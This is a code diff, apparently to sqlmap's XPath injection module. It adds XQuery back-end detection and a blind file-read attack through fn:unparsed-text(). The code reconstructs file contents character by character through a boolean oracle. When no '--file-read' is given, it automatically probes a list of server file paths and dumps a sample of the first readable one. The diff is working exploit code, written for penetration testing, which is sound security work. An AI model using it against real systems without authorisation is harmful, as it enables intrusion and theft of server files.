@@ -11,7 +11,10 @@ import time
 from collections import namedtuple
 
 from lib.core.common import beep
+from lib.core.common import dataToOutFile
 from lib.core.common import randomStr
+from lib.core.common import removeReflectiveValues
+from lib.core.convert import getBytes
 from lib.core.convert import getUnicode
 from lib.core.data import conf
 from lib.core.data import logger
@@ -32,6 +35,11 @@ from lib.core.settings import XPATH_ERROR_REGEX
 from lib.core.settings import XPATH_ERROR_SIGNATURES
 from lib.core.settings import XPATH_MAX_DEPTH
 from lib.core.settings import XPATH_MAX_LENGTH
+from lib.core.settings import XQUERY_CAPABILITY_PROBES
+from lib.core.settings import XQUERY_FILE_READ
+from lib.core.settings import XQUERY_FILE_HARVEST
+from lib.core.settings import XQUERY_HARVEST_CHARS
+from lib.core.settings import XQUERY_MAX_FILE_LENGTH
 from lib.request.connect import Connect as Request
 from lib.utils.xrange import xrange
 
@@ -152,6 +160,12 @@ def _send(place, parameter, value):
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
         page, _, code = Request.getPage(**kwargs)
+        # Strip the payload back out before anyone compares pages. An endpoint that ECHOES the parameter
+        # differs between any two probes simply because the two payloads differ - which satisfies a
+        # true/false differential, and even the XPath-only confirm battery, without a single expression
+        # ever being evaluated. That reported XSLT (and plain reflective) endpoints as XPath-injectable.
+        # On a genuinely blind target the payload is not in the page, so this is a no-op.
+        page = removeReflectiveValues(page, value, suppressWarning=True)
         # A transport failure or a BLOCKED/ERROR status (5xx, 403/429 WAF/rate-limit) is NOT a usable
         # oracle sample: returning "" for it would let a one-sided failure fake a true/false divergence
         # (an empty body cannot be told apart from a dead connection). Signal it as None -> the boolean
@@ -371,16 +385,20 @@ class _XPathPayloadBuilder(object):
     def stringLengthAtLeast(self, target, n):
         return self._make("string-length(%s)>=%d" % (target, n))
 
-    def charPresent(self, target, pos):
+    def charPresent(self, target, pos, literal=None):
         # True when the character at 1-based position `pos` of `target` belongs to
         # the known ordered charset (so its index can be resolved by bisection).
-        return self._make("contains(%s,substring(%s,%d,1))" % (_CS_LITERAL, target, pos))
+        return self._make("contains(%s,substring(%s,%d,1))" % (literal or _CS_LITERAL, target, pos))
 
-    def charIndexAtLeast(self, target, pos, n):
+    def charIndexAtLeast(self, target, pos, n, literal=None):
         # The 0-based index of a charset member equals the length of the charset
         # prefix preceding it (XPath 1.0 has no lexicographic '<', but
         # string-length(substring-before(...)) yields a number we can bisect on).
-        return self._make("string-length(substring-before(%s,substring(%s,%d,1)))>=%d" % (_CS_LITERAL, target, pos, n))
+        return self._make("string-length(substring-before(%s,substring(%s,%d,1)))>=%d" % (literal or _CS_LITERAL, target, pos, n))
+
+    def predicate(self, expression):
+        """Send an arbitrary boolean expression through the verified boundary (XQuery capability probes)."""
+        return self._make(expression)
 
 
 def _makeOracle(place, parameter, boundary, base):
@@ -522,7 +540,7 @@ def _inferCount(oracle, builder, path, countFn, maxCount=128):
         return None
 
 
-def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
+def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH, ords=None, literal=None):
     """Blindly recover the string value of XPath expression `target` (e.g.
     "name(/*)" or "string(/*[1]/@*[1])") using binary search.
 
@@ -547,10 +565,11 @@ def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
 
         chars = []
         probes = 0
-        last = len(_CS_ORDS) - 1
+        ords = ords or _CS_ORDS
+        last = len(ords) - 1
         for pos in xrange(1, length + 1):
             probes += 1
-            if not oracle.extract(builder.charPresent(target, pos)):
+            if not oracle.extract(builder.charPresent(target, pos, literal)):
                 chars.append("?")
                 continue
 
@@ -558,11 +577,11 @@ def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
             while clo < chi:
                 cmid = (clo + chi + 1) // 2
                 probes += 1
-                if oracle.extract(builder.charIndexAtLeast(target, pos, cmid)):
+                if oracle.extract(builder.charIndexAtLeast(target, pos, cmid, literal)):
                     clo = cmid
                 else:
                     chi = cmid - 1
-            chars.append(chr(_CS_ORDS[clo]))
+            chars.append(chr(ords[clo]))
     except InconclusiveError:
         # abort this value rather than emit a length/char chosen from an ambiguous bit
         logger.warning("XPath string inference aborted (oracle inconclusive after retries)")
@@ -571,6 +590,68 @@ def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
     value = "".join(chars)
     logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, length))
     return value or None
+
+
+# File content carries bytes the XML-tree charset deliberately excludes (tab, newline, quotes, angle
+# brackets). Recovering a file with those replaced by '?' would be worse than useless, so a file read gets
+# its own charset. Tab and newline are produced with fn:codepoints-to-string() rather than an XML
+# character reference: the payload travels in a query-string parameter, where a literal '&' would split
+# it into two parameters. This literal is only ever used on the XQuery path, where the function exists.
+_FILE_ORDS = [0x09, 0x0a] + [_ for _ in xrange(XPATH_CHAR_MIN, XPATH_CHAR_MAX + 1)]
+# Built entirely from codepoints rather than a quoted string: the charset contains ', ", & and < , each of
+# which is either illegal bare in an XQuery string literal ('&' -> "Invalid entity") or would need
+# escaping that survives URL transport. fn:codepoints-to-string() takes the whole sequence and has none of
+# those hazards.
+_FILE_LITERAL = "codepoints-to-string((%s))" % ",".join(str(_) for _ in _FILE_ORDS)
+
+
+def _probeXQuery(oracle, builder):
+    """True when the injected expression reaches an XQuery / XPath 2.0+ processor rather than an XPath 1.0
+    one. Each probe calls a function that does not exist in 1.0, so a positive answer is a capability the
+    engine demonstrated - not an inference from an error string or a version banner.
+
+    A second, NEGATIVE control matters here: an oracle that answers TRUE to everything would otherwise be
+    read as 'XQuery'. The false control must come back false for the verdict to stand."""
+
+    try:
+        if oracle.extract(builder.predicate("string-join(('a','b'),'')='zz'")):
+            return False        # answers true to a FALSE probe -> oracle is not discriminating
+        for probe in XQUERY_CAPABILITY_PROBES:
+            if oracle.extract(builder.predicate(probe)):
+                return True
+    except InconclusiveError:
+        return False
+    return False
+
+
+def _xqueryFileRead(oracle, builder, path, quiet=False, maxLen=XQUERY_MAX_FILE_LENGTH):
+    """Recover a text file through fn:unparsed-text() using the same blind bisection that walks the XML
+    tree - the boundary is already proven, so this needs no new oracle. `quiet` suppresses the
+    not-readable notice, because the proactive harvest expects most of its paths to be absent."""
+
+    target = XQUERY_FILE_READ % _xpathQuote(path)
+    try:
+        if not oracle.extract(builder.predicate("string-length(%s)>0" % target)):
+            if not quiet:
+                logger.warning("XQuery file read: '%s' is empty or not readable" % path)
+            return None
+    except InconclusiveError:
+        return None
+    return _inferString(oracle, builder, target, maxLen=maxLen,
+                        ords=_FILE_ORDS, literal=_FILE_LITERAL)
+
+
+def _dumpFileRead(remoteFile, content):
+    """Save an XQuery-read file to the output directory (parity with '--file-read')."""
+    try:
+        localPath = dataToOutFile(remoteFile, getBytes(content))
+    except Exception as ex:
+        logger.debug("could not save the XQuery-read file to disk: %s" % getUnicode(ex))
+        localPath = None
+    if localPath:
+        conf.dumper.rFile([localPath])
+    else:
+        conf.dumper.singleString("XQuery file read ('%s'):\n%s" % (remoteFile, content))
 
 
 def _walkTree(oracle, builder, path="/*", depth=0):
@@ -799,8 +880,54 @@ def xpathScan():
                 logger.info("identified back-end: '%s'" % backend)
                 slot = slot._replace(backend=backend)
 
-    title = "XPath boolean-based blind"
-    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: XPath injection\n    Title: %s\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, title, slot.parameter, slot.payload))
+    # An XQuery/XPath-2.0+ processor accepts the same boundary but a far larger language, so say so and
+    # use it: fn:unparsed-text() turns the proven boolean oracle into a file-read primitive.
+    isXQuery = _probeXQuery(oracle, builder)
+    if isXQuery:
+        logger.info("the back-end evaluates XQuery / XPath 2.0+ (fn:string-join, fn:matches, fn:unparsed-text are available)")
+        if slot.backend in (None, "Generic XPath"):
+            slot = slot._replace(backend="Generic XQuery / XPath 2.0+")
+
+    title = "XQuery boolean-based blind" if isXQuery else "XPath boolean-based blind"
+    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: %s injection\n    Title: %s\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, "XQuery" if isXQuery else "XPath", title, slot.parameter, slot.payload))
+
+    if isXQuery:
+        # A confirmed XQuery back-end is exploited automatically, like every other non-SQL engine: the
+        # tree walk below is the data dump, and fn:unparsed-text() is the file-read impact. An explicit
+        # '--file-read' overrides the harvest and is honoured verbatim instead.
+        if conf.fileRead:
+            logger.info("reading file '%s' through fn:unparsed-text()" % conf.fileRead)
+            content = _xqueryFileRead(oracle, builder, conf.fileRead)
+            if content:
+                logger.info("XQuery file read succeeded (%d characters)" % len(content))
+                _dumpFileRead(conf.fileRead, content)
+            else:
+                logger.warning("XQuery file read of '%s' failed" % conf.fileRead)
+        else:
+            # Readability is PROVED across the list for about one request per path, then a short
+            # prefix is sampled from the first hit. Extracting every file would cost thousands of
+            # bisection round-trips - impact is established by reading a file at all, not by volume.
+            logger.info("probing which files are readable through fn:unparsed-text()")
+            readable = []
+            for path in XQUERY_FILE_HARVEST:
+                try:
+                    if oracle.extract(builder.predicate("string-length(%s)>0" % (XQUERY_FILE_READ % _xpathQuote(path)))):
+                        readable.append(path)
+                        logger.info("'%s' is readable" % path)
+                except InconclusiveError:
+                    break
+            if readable:
+                sample = _xqueryFileRead(oracle, builder, readable[0], quiet=True, maxLen=XQUERY_HARVEST_CHARS)
+                if sample:
+                    logger.info("read the first %d characters of '%s'" % (len(sample), readable[0]))
+                    _dumpFileRead(readable[0], sample)
+                conf.dumper.singleString("XQuery: readable through fn:unparsed-text():\n%s"
+                                         % "\n".join("  %s" % _ for _ in readable))
+                logger.info("use '--file-read' to pull one of these in full")
+            else:
+                logger.info("no file could be read automatically through fn:unparsed-text()")
+    elif conf.fileRead:
+        logger.warning("'--file-read' needs an XQuery / XPath 2.0+ back-end; this one is XPath 1.0 only")
 
     # Blind XML tree-walking (attempted document-root traversal)
     logger.info("walking XML document tree (depth limit: %d)" % XPATH_MAX_DEPTH)
